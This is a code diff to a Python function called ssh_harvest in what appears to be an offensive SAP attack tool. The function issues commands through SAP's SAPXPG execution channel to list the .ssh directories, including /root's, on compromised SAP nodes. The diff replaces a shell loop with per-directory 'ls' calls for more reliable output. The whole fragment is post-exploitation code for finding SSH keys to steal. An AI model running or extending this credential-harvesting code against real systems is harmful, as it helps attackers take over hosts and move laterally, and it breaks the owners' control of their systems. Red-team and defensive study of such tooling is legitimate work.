@@ -267,36 +267,27 @@ def ssh_harvest(node: SAPNode, state: SAPMAPState,
           f"login shells")
 
     # ---- Step 2: discover SSH directories
+    # Use individual simple commands per home dir — complex shell
+    # for-loops are fragile through SAPXPG's TLV stdout channel.
     homes_to_check = list(set(home_dirs.values()))
     if "/root" not in homes_to_check:
         homes_to_check.append("/root")
 
-    ssh_find_cmd = (
-        "for d in " + " ".join(f'"{h}"' for h in homes_to_check) + "; do "
-        '  if [ -d "$d/.ssh" ]; then '
-        '    echo "SSH_DIR $d/.ssh"; '
-        '    ls -1 "$d/.ssh/" 2>/dev/null | while read f; do '
-        '      echo "SSH_FILE $d/.ssh/$f"; '
-        '    done; '
-        "  fi; "
-        "done"
-    )
-    ssh_out = exec_fn(ssh_find_cmd)
     ssh_dirs = {}
-    for line in ssh_out.splitlines():
-        line = line.strip()
-        m_dir = re.match(r"SSH_DIR\s+(.+)", line)
-        if m_dir:
-            d = m_dir.group(1)
-            if d not in ssh_dirs:
-                ssh_dirs[d] = []
-        m_file = re.match(r"SSH_FILE\s+(.+)", line)
-        if m_file:
-            fp = m_file.group(1)
-            parent = os.path.dirname(fp)
-            if parent not in ssh_dirs:
-                ssh_dirs[parent] = []
-            ssh_dirs[parent].append(os.path.basename(fp))
+    for home in homes_to_check:
+        ssh_path = f"{home}/.ssh"
+        ls_out = exec_fn(f"ls -1 {ssh_path} 2>/dev/null")
+        if not ls_out or not ls_out.strip():
+            continue
+        files = []
+        for ln in ls_out.splitlines():
+            fn = ln.strip()
+            if fn and not fn.startswith("total") and not fn.startswith("ls:"):
+                files.append(fn)
+        if files:
+            ssh_dirs[ssh_path] = files
+            print(f"  [*] {sid}: found .ssh at {ssh_path}: "
+                  f"{', '.join(files)}")
 
     print(f"[*] {sid}: ssh_harvest — {len(ssh_dirs)} .ssh directories")
 
